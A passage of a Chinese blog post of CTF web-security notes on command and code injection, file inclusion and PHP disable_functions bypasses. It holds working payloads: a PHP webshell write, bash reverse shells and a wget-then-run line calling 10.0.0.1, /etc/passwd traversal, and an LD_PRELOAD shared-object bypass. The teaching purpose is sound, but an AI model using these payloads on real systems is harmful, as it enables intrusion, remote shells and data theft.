+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">subprocess</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">GET</span><span class="p">[</span><span class="sh">'</span><span class="s">ip</span><span class="sh">'</span><span class="p">]</span>
+<span class="c1"># 用列表传参，subprocess不会解析shell语法
+</span><span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="sh">"</span><span class="s">ping</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-c</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">4</span><span class="sh">"</span><span class="p">,</span> <span class="n">ip</span><span class="p">])</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>防死写法2（shlex.quote）</strong>：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">shlex</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="n">shlex</span><span class="p">.</span><span class="nf">quote</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">GET</span><span class="p">[</span><span class="sh">'</span><span class="s">ip</span><span class="sh">'</span><span class="p">])</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">ping -c 4 </span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Java</strong></p>
+
+<p><strong>防死写法（ProcessBuilder + 列表）</strong>：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="nc">String</span> <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"ip"</span><span class="o">);</span>
+<span class="nc">ProcessBuilder</span> <span class="n">pb</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ProcessBuilder</span><span class="o">(</span><span class="s">"ping"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="s">"4"</span><span class="o">,</span> <span class="n">ip</span><span class="o">);</span>
+<span class="n">pb</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Node.js</strong></p>
+
+<p><strong>防死写法（exec + 转义库）</strong>：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="p">{</span> <span class="nx">exec</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">escape</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">shell-escape</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">ip</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">ip</span><span class="p">;</span>
+<span class="nf">exec</span><span class="p">(</span><span class="s2">`ping -c 4 </span><span class="p">${</span><span class="nf">escape</span><span class="p">([</span><span class="nx">ip</span><span class="p">])}</span><span class="s2">`</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>防死写法（execFile）</strong>：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="p">{</span> <span class="nx">execFile</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">);</span>
+<span class="nf">execFile</span><span class="p">(</span><span class="dl">'</span><span class="s1">ping</span><span class="dl">'</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">-c</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">4</span><span class="dl">'</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">ip</span><span class="p">]);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<hr />
+
+<h3 id="13-代码注入">1.3 代码注入</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">语言</th>
+      <th style="text-align: left">危险函数</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">PHP</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">eval</code>、<code class="language-plaintext highlighter-rouge">assert</code>、<code class="language-plaintext highlighter-rouge">preg_replace(/e)</code>、<code class="language-plaintext highlighter-rouge">create_function</code>、<code class="language-plaintext highlighter-rouge">include</code>/<code class="language-plaintext highlighter-rouge">require</code>（文件包含也算代码注入的一种）</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Python</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">eval()</code>、<code class="language-plaintext highlighter-rouge">exec()</code>、<code class="language-plaintext highlighter-rouge">compile()</code>、<code class="language-plaintext highlighter-rouge">execfile()</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">JavaScript（Node.js）</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">eval()</code>、<code class="language-plaintext highlighter-rouge">new Function()</code>、<code class="language-plaintext highlighter-rouge">setTimeout</code>/<code class="language-plaintext highlighter-rouge">setInterval</code> 字符串参数</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Java</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ScriptEngineManager</code> + <code class="language-plaintext highlighter-rouge">eval</code>（部分场景）</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Ruby</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">eval</code>、<code class="language-plaintext highlighter-rouge">instance_eval</code>、<code class="language-plaintext highlighter-rouge">class_eval</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>主要分两种类型。一种是达到题目要求后就自动读取 flag；另一种是拿到一个可交互的 shell 自行获取 flag，需反弹 / 写  Webshell / 内存马（WebLogic 等）。</p>
+
+<h4 id="读取-flag-类">读取 flag 类</h4>
+
+<p><strong>已知代码注入点（如 <code class="language-plaintext highlighter-rouge">eval($_GET['a'])</code>），但无系统命令执行函数。</strong></p>
+
+<p>解法：用代码注入点执行文件读取。</p>
+
+<p><strong>PHP</strong></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">a</span><span class="o">=</span><span class="k">print</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">));</span>
+<span class="o">?</span><span class="n">a</span><span class="o">=</span><span class="nb">show_source</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">);</span>
+<span class="o">?</span><span class="n">a</span><span class="o">=</span><span class="nb">readfile</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">);</span>
+<span class="o">?</span><span class="n">a</span><span class="o">=</span><span class="k">include</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">);</span>   <span class="c1">// flag 是文本就直接输出</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Python</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="err">?</span><span class="n">code</span><span class="o">=</span><span class="nf">print</span><span class="p">(</span><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">/flag</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">())</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Node.js</strong></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">?</span><span class="nx">code</span><span class="o">=</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">).</span><span class="nf">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">/flag</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="getshell-类代码注入点--需要系统权限">GetShell 类（代码注入点 + 需要系统权限）</h4>
+
+<p><strong>方法 1：写入 Webshell（有 Web 路径可写）</strong></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>?a=file_put_contents('/var/www/html/shell.php','<span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="n">cmd</span><span class="p">]);</span><span class="cp">?&gt;</span>');
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>然后蚁剑/菜刀连接 <code class="language-plaintext highlighter-rouge">/shell.php</code>。</p>
+
+<p><strong>方法 2：反弹 Shell（目标能出网）</strong></p>
+
+<p><strong>PHP</strong></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">a</span><span class="o">=</span><span class="nb">system</span><span class="p">(</span><span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1"'</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Python</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="err">?</span><span class="n">code</span><span class="o">=</span><span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">bash -c </span><span class="sh">"</span><span class="s">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</span><span class="sh">"'</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>curl/wget 反弹</p>
+
+<p>先写文件再引用命令。</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">a</span><span class="o">=</span><span class="nb">system</span><span class="p">(</span><span class="s1">'wget 10.0.0.1/shell.sh -O /tmp/x; bash /tmp/x'</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="文件包含lfi--rfi与代码注入">文件包含（LFI / RFI）与代码注入</h4>
+
+<p>文件包含是指后端程序<strong>动态引入一个文件</strong>，并且被引入的文件被当作代码执行。</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
+<span class="k">include</span><span class="p">(</span><span class="nv">$page</span> <span class="mf">.</span> <span class="s2">".php"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>如果 <code class="language-plaintext highlighter-rouge">$page</code> <strong>用户</strong>可控，就产生 <strong>文件包含漏洞</strong>。比如：</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="err">?file=../../../../etc/passwd
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>✅ 文件包含（LFI/RFI）是一种特殊的代码注入：代码不在参数中，而在文件中。LFI 读本地文件，RFI 打远程。配合日志、上传、环境变量可拿 Shell。</strong></p>
+
+<h4 id="绕过-disable_functions-思路php">绕过 disable_functions 思路（PHP）</h4>
+
+<blockquote>
+  <p>什么是 disable_functions？</p>
+</blockquote>
+
+<p>PHP 配置文件 <code class="language-plaintext highlighter-rouge">php.ini</code> 中有一个选项：</p>
+
+<div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="py">disable_functions</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">system, exec, shell_exec, passthru, popen, proc_open, ...</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>禁用了这些函数后，即使有代码注入（比如 <code class="language-plaintext highlighter-rouge">eval($_GET['a'])</code>），也无法直接执行系统命令。</p>
+
+<p>这是 CTF 中 PHP 高难题的常见障碍。</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">类别</th>
+      <th style="text-align: left">方法</th>
+      <th style="text-align: left">前置条件</th>
+      <th style="text-align: left">CTF 频率</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><strong>黑名单绕过</strong></td>
+      <td style="text-align: left">利用未禁用的函数</td>
+      <td style="text-align: left">存在漏网函数</td>
+      <td style="text-align: left">低</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><strong>命令执行环境</strong></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">LD_PRELOAD</code>、<code class="language-plaintext highlighter-rouge">mail</code> 等</td>
+      <td style="text-align: left">可上传文件、调用 <code class="language-plaintext highlighter-rouge">mail</code></td>
+      <td style="text-align: left">高</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><strong>利用 PHP 扩展</strong></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">FFI</code>、<code class="language-plaintext highlighter-rouge">imap</code>、<code class="language-plaintext highlighter-rouge">exif</code> 等扩展</td>
+      <td style="text-align: left">扩展已安装且未禁用</td>
+      <td style="text-align: left">中</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><strong>利用数据库</strong></td>
+      <td style="text-align: left">MySQL <code class="language-plaintext highlighter-rouge">select into outfile</code></td>
+      <td style="text-align: left">有数据库连接写权限</td>
+      <td style="text-align: left">中</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><strong>环境变量攻击</strong></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">$_ENV</code>、<code class="language-plaintext highlighter-rouge">putenv</code> + 触发外部程序</td>
+      <td style="text-align: left">可调用外部程序</td>
+      <td style="text-align: left">中</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><strong>危险 PHP 函数</strong></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">pcntl_exec</code>、<code class="language-plaintext highlighter-rouge">imageMagick</code>、<code class="language-plaintext highlighter-rouge">bash</code> 漏洞</td>
+      <td style="text-align: left">特定版本</td>
+      <td style="text-align: left">低</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><strong>GC 绕过</strong></td>
+      <td style="text-align: left">垃圾回收触发</td>
+      <td style="text-align: left">PHP 特定版本</td>
+      <td style="text-align: left"> </td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>1. 检查漏网函数（最基础）</strong></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="nb">system</span><span class="p">(</span><span class="s1">'id'</span><span class="p">);</span>
+<span class="nb">exec</span><span class="p">(</span><span class="s1">'id'</span><span class="p">);</span>
+<span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'id'</span><span class="p">);</span>
+<span class="nb">passthru</span><span class="p">(</span><span class="s1">'id'</span><span class="p">);</span>
+<span class="nb">popen</span><span class="p">(</span><span class="s1">'id'</span><span class="p">,</span><span class="s1">'r'</span><span class="p">);</span>
+<span class="nb">proc_open</span><span class="p">(</span><span class="s1">'id'</span><span class="p">,</span> <span class="p">[],</span> <span class="nv">$pipes</span><span class="p">);</span>
+<span class="nb">pcntl_exec</span><span class="p">(</span><span class="s1">'/bin/bash'</span><span class="p">,</span> <span class="p">[</span><span class="s1">'-c'</span><span class="p">,</span> <span class="s1">'id'</span><span class="p">]);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>2. <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> + <code class="language-plaintext highlighter-rouge">mail</code>（经典绕过）</strong></p>
+
+<p><strong>条件</strong>：可上传 <code class="language-plaintext highlighter-rouge">.so</code> 文件、<code class="language-plaintext highlighter-rouge">mail</code> 函数未禁用。</p>
+
+<p><strong>原理</strong>：<code class="language-plaintext highlighter-rouge">mail()</code> 函数会调用外部程序 <code class="language-plaintext highlighter-rouge">/usr/sbin/sendmail</code>，在这个过程中可以劫持系统库函数执行命令。</p>
+
+<p>先写一个 <code class="language-plaintext highlighter-rouge">.c</code> 文件（比如 <code class="language-plaintext highlighter-rouge">bypass.c</code>）：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="cp">#define _GNU_SOURCE
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span>
+<span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">preload</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">unsetenv</span><span class="p">(</span><span class="s">"LD_PRELOAD"</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"id"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>然后编译成 <code class="language-plaintext highlighter-rouge">.so</code>：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>gcc <span class="nt">-shared</span> <span class="nt">-fPIC</span> bypass.c <span class="nt">-o</span> bypass.so
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>再利用文件上传/写文件，把 <code class="language-plaintext highlighter-rouge">bypass.so</code> 传到目标服务器。</p>
+
+<p>代码注入执行：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nb">putenv</span><span class="p">(</span><span class="s2">"LD_PRELOAD=/tmp/bypass.so"</span><span class="p">);</span>
+<span class="nb">mail</span><span class="p">(</span><span class="s2">"a@b.c"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="s2">""</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>3. 利用 PHP 扩展（FFI）</strong></p>
+
+<p><strong>条件</strong>：<code class="language-plaintext highlighter-rouge">ffi</code> 扩展已安装且未禁用。</p>
+
+<p><strong>原理</strong>：PHP 7.4 引入了 <code class="language-plaintext highlighter-rouge">FFI</code>，可以直接调用 C 库函数。</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nv">$ffi</span> <span class="o">=</span> <span class="no">FFI</span><span class="o">::</span><span class="nf">cdef</span><span class="p">(</span><span class="s2">"int system(const char *command);"</span><span class="p">,</span> <span class="s2">"libc.so.6"</span><span class="p">);</span>
+<span class="nv">$ffi</span><span class="o">-&gt;</span><span class="nb">system</span><span class="p">(</span><span class="s2">"id"</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>4. 利用数据库写 Webshell</strong></p>
+
+<p>如果有数据库连接，且权限足够（<code class="language-plaintext highlighter-rouge">file_priv</code>）：</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="k">select</span> <span class="s1">'&lt;?php eval($_POST[cmd]);?&gt;'</span> <span class="k">into</span> <span class="n">outfile</span> <span class="s1">'/var/www/html/shell.php'</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>利用代码注入执行这条 SQL。</p>
+
+<p><strong>5. <code class="language-plaintext highlighter-rouge">pcntl_exec</code> 绕过</strong></p>
+
+<p><strong>条件</strong>：<code class="language-plaintext highlighter-rouge">pcntl</code> 扩展已安装，且 <code class="language-plaintext highlighter-rouge">pcntl_exec</code> 未禁用。</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">pcntl_exec</span><span class="p">(</span><span class="s2">"/bin/bash"</span><span class="p">,</span> <span class="p">[</span><span class="s2">"-c"</span><span class="p">,</span> <span class="s2">"id"</span><span class="p">]);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>（————————-占位————————-<em>太多了，以后补吧</em>）</p>
+
+<h3 id="14-ldap-注入">1.4 LDAP 注入</h3>
+
+<p><strong>LDAP 注入与 SQL 注入的对比</strong></p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">特性</th>
+      <th style="text-align: left">SQL 注入</th>
+      <th style="text-align: left">LDAP 注入</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">目标</td>
+      <td style="text-align: left">关系型数据库</td>
+      <td style="text-align: left">目录服务</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">查询语言</td>
+      <td style="text-align: left">SQL</td>
+      <td style="text-align: left">LDAP 过滤条件（RFC 2254 定义的语法）</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">典型操作</td>
+      <td style="text-align: left">增删改查</td>
+      <td style="text-align: left">查询为主（认证场景最易利用）</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">危害</td>
+      <td style="text-align: left">数据窃取、篡改、删库</td>
+      <td style="text-align: left">认证绕过、信息泄露（读取目录数据）</td>
+    </tr>
+  </tbody>
+</table>
+
+
+                <hr style="visibility: hidden;">
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/%E5%88%86%E7%B1%BB%E5%90%8D%E7%A7%B0/2026/05/15/C&C++%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" data-toggle="tooltip" data-placement="top" title="C/C++数据结构">
+                        上一篇<br>
+                        <span>C/C++数据结构</span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/%E5%88%86%E7%B1%BB%E5%90%8D%E7%A7%B0/2026/05/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%89%AB%E7%9B%B2/" data-toggle="tooltip" data-placement="top" title="计算机扫盲">
+                        下一篇<br>
+                        <span>计算机扫盲</span>
+                        </a>
+                    </li>
+                    
+                </ul>
+                <hr style="visibility: hidden;">
+
+                <!-- giscus 评论系统 - 延迟加载 -->
+                <div class="comment" id="comment-section">
+                    <h4>💬 评论</h4>
+                    <div id="comment-placeholder" style="color: #999; font-size: 14px;">评论加载中...</div>
+                </div>
+                <script>
+                (function() {
+                    function loadComments() {
+                        var placeholder = document.getElementById('comment-placeholder');
+                        if (!placeholder) return;
+                        
+                        var script = document.createElement('script');
+                        script.src = 'https://giscus.app/client.js';
+                        script.setAttribute('data-repo', 'PurgationDevil/PurgationDevil.github.io');
+                        script.setAttribute('data-repo-id', 'R_kgDOR4wBWA');
+                        script.setAttribute('data-category', 'General');
+                        script.setAttribute('data-category-id', 'DIC_kwDOR4wBWM4C83Ny');
+                        script.setAttribute('data-mapping', 'pathname');
+                        script.setAttribute('data-strict', '0');
+                        script.setAttribute('data-reactions-enabled', '1');
+                        script.setAttribute('data-emit-metadata', '0');
+                        script.setAttribute('data-input-position', 'bottom');
+                        script.setAttribute('data-theme', 'preferred_color_scheme');
+                        script.setAttribute('data-lang', 'zh-CN');
+                        script.setAttribute('crossorigin', 'anonymous');
+                        script.async = true;
+                        
+                        placeholder.innerHTML = '';
+                        placeholder.appendChild(script);
+                    }
+                    
+                    // 监听滚动，等评论区域进入视口时加载
+                    var observer = new IntersectionObserver(function(entries) {
+                        if (entries[0].isIntersecting) {
+                            loadComments();
+                            observer.disconnect();
+                        }
+                    }, { rootMargin: '200px' });
+                    
+                    var commentSection = document.getElementById('comment-section');
+                    if (commentSection) {
+                        observer.observe(commentSection);
+                    }
+                })();
+                </script>
+            </div>  
+
+    <!-- Side Catalog Container -->
+        
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+        
+
+    <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+
+
+
+                <!-- Friends Blog -->
+                
+<hr>
+<h5>FRIENDS</h5>
+<ul class="list-inline">
+  
+  <li><a href="http://qiyue.jiushi.gay/">七月的博客</a></li>
+  
+</ul>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<!-- add support for mathjax by voleking-->
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("//cdnjs.cloudflare.com/ajax/libs/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'right',
+          // icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+</div>
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p class="copyright text-muted">
+                    Copyright &copy; PurgationDevil Blog 2026
+                    <br>
+                    Powered by Jekyll
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js "></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js "></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js "></script>
+
+<!-- Simple Jekyll Search -->
+<script src="/js/simple-jekyll-search.min.js"></script>
+<script>
+(function() {
+    SimpleJekyllSearch({
+        searchInput: document.getElementById('search-input'),
+        resultsContainer: document.getElementById('search-results'),
+        json: '/search.json',
+        searchResultTemplate: '<div class="post-preview"><a href="{url}"><h2 class="post-title">{title}</h2><div class="post-meta">标签: {tags} | {date}</div></a></div>',
+        noResultsText: '<div class="alert alert-warning">没有找到相关文章</div>'
+    });
+    
+    var searchPage = document.querySelector('.search-page');
+    var searchIcon = document.querySelector('.search-icon a');
+    var searchClose = document.querySelector('.search-icon-close');
+    var searchInput = document.getElementById('search-input');
+    
+    if (searchIcon) {
+        searchIcon.addEventListener('click', function() {
+            searchPage.classList.add('search-active');
+            setTimeout(function() {
+                searchInput.focus();
+            }, 400);
+        });
+    }
+    
